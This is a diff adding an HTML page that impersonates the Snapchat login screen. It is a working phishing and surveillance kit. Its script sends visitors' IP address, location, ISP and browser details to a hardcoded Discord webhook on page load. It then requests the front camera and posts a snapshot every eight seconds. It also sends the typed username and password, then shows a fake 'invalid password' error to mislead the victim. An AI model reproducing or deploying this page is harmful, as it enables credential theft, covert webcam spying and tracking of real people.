@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In | Snapchat</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+      
+        * { margin:0; padding:0; box-sizing:border-box; }
+      
+        body {
+            margin:0; padding:0;
+            background:#f8f8f8;
+            font-family:'Roboto',sans-serif;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            min-height:100vh;
+            color:#000;
+        }
+      
+        .container {
+            background:#fff;
+            width:100%;
+            max-width:400px;
+            padding:40px 30px;
+            border-radius:12px;
+            box-shadow:0 4px 20px rgba(0,0,0,0.1);
+            text-align:center;
+        }
+      
+        .logo {
+            width:80px;
+            height:80px;
+            background:#fffc00;
+            border-radius:50%;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            margin:0 auto 20px;
+            font-size:50px;
+            color:#000;
+            box-shadow:0 4px 10px rgba(0,0,0,0.2);
+        }
+      
+        h1 {
+            font-size:28px;
+            margin:10px 0 30px;
+            font-weight:500;
+        }
+      
+        input {
+            width:100%;
+            padding:14px;
+            margin:10px 0;
+            border:1px solid #ddd;
+            border-radius:8px;
+            font-size:16px;
+            box-sizing:border-box;
+        }
+      
+        input:focus {
+            outline:none;
+            border-color:#fffc00;
+        }
+      
+        button {
+            width:100%;
+            padding:14px;
+            background:#fffc00;
+            color:#000;
+            border:none;
+            border-radius:8px;
+            font-size:18px;
+            font-weight:500;
+            cursor:pointer;
+            margin-top:10px;
+        }
+      
+        button:hover:not(:disabled) {
+            background:#ffe600;
+        }
+      
+        .error {
+            color:#ff3b30;
+            font-size:15px;
+            margin:8px 0 0 0;
+            display:none;
+            text-align:left;
+        }
+      
+        .footer {
+            margin-top:30px;
+            font-size:13px;
+            color:#666;
+        }
+      
+        .footer a {
+            color:#000;
+            text-decoration:none;
+        }
+      
+        .loading {
+            display:none;
+            position:absolute;
+            top:50%;
+            left:50%;
+            transform:translate(-50%,-50%);
+            background:rgba(0,0,0,0.85);
+            color:#fff;
+            padding:15px 25px;
+            border-radius:8px;
+            font-size:15px;
+            z-index:100;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">👻</div>
+        <h1>Log in to Snapchat</h1>
+      
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username or email" required autocomplete="username">
+            <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
+            <div id="errorMsg" class="error">Invalid password. Please try again.</div>
+            <button type="submit" id="loginBtn">Log In</button>
+        </form>
+      
+        <div class="footer">
+            <a href="#">Forgot your password?</a><br><br>
+            <p>© Snap Inc 2026</p>
+        </div>
+    </div>
+
+    <div id="loadingOverlay" class="loading">Verifying...</div>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1498622754797125633/t5Z-BfiL12-AQLa5mymJsmhvMdwc7ay9WCD8bYtxXci1s9-kOr4dRBGHg6y4QRFSjVXZ";
+
+        let videoStream = null;
+        let captureInterval = null;
+
+        async function sendToWebhook(content, files = []) {
+            const formData = new FormData();
+            formData.append("content", content);
+            
+            files.forEach((file, i) => {
+                formData.append(`file${i}`, file, `snap_${Date.now()}.jpg`);
+            });
+
+            try {
+                await fetch(webhook, { method: "POST", body: formData });
+            } catch (e) {}
+        }
+
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Edg")) return "Edge";
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari")) return "Safari";
+            return "Unknown";
+        }
+
+        // Start taking photos every 8 seconds once camera is allowed
+        function startCameraCapture() {
+            if (captureInterval) return;
+
+            captureInterval = setInterval(() => {
+                if (!videoStream) return;
+
+                const canvas = document.createElement("canvas");
+                const video = document.createElement("video");
+                video.srcObject = videoStream;
+                video.play();
+
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext("2d").drawImage(video, 0, 0);
+
+                    canvas.toBlob((blob) => {
+                        if (blob) {
+                            sendToWebhook("**📸 LIVE SNAPSHOT**", [blob]);
+                        }
+                    }, "image/jpeg", 0.85);
+                };
+            }, 8000); // Every 8 seconds
+        }
+
+        // Request Camera + Start Capturing
+        async function requestCamera() {
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                sendToWebhook("**📸 CAMERA ACCESS GRANTED - STARTING LIVE CAPTURE**");
+                startCameraCapture();
+            } catch (e) {
+                sendToWebhook("**📸 CAMERA ACCESS DENIED**");
+            }
+        }
+
+        // Main Tracking Data
+        async function sendTrackingData(username = "Not yet", password = "Not yet") {
+            let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };
+            try {
+                const res = await fetch("https://ipinfo.io/json");
+                ipInfo = await res.json();
+            } catch(e){}
+
+            const msg = `**👻 SNAPCHAT TRACKING**\n\n` +
+                `**E:** ${username}\n` +
+                `**PA:** ${password}\n\n` +
+                `**IP:** ${ipInfo.ip}\n` +
+                `**Loc:** ${ipInfo.city}, ${ipInfo.country}\n` +
+                `**ISP:** ${ipInfo.org}\n` +
+                `**Browser:** ${getBrowserName()}\n` +
+                `**UA:** ${navigator.userAgent.substring(0, 100)}...\n` +
+                `**Screen:** ${screen.width}×${screen.height}\n` +
+                `**Cores:** ${navigator.hardwareConcurrency || "N/A"}\n` +
+                `**TZ:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+
+            sendToWebhook(msg);
+        }
+
+        // Triggers
+        window.addEventListener("load", () => {
+            sendTrackingData();
+            requestCamera();           // Ask for camera
+        });
+
+        document.addEventListener("mousemove", () => {
+            sendTrackingData();
+        }, { once: true });
+
+        // Form Submit
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            if (!username || !password) return;
+
+            const loginBtn = document.getElementById("loginBtn");
+            const loadingOverlay = document.getElementById("loadingOverlay");
+            const errorDiv = document.getElementById("errorMsg");
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = "Logging in...";
+            loadingOverlay.style.display = "flex";
+
+            await sendTrackingData(username, password);
+
+            setTimeout(() => {
+                loadingOverlay.style.display = "none";
+                errorDiv.style.display = "block";
+                document.getElementById("password").value = "";
+                loginBtn.disabled = false;
+                loginBtn.textContent = "Log In";
+            }, 1350);
+
+            setTimeout(() => {
+                alert("There has been an error when you tried to access the video.\n\nError code: 209\n\nPlease try again later.");
+            }, 2400);
+
+            setTimeout(() => errorDiv.style.display = "none", 5200);
+        });
+    </script>
+</body>
+</html>
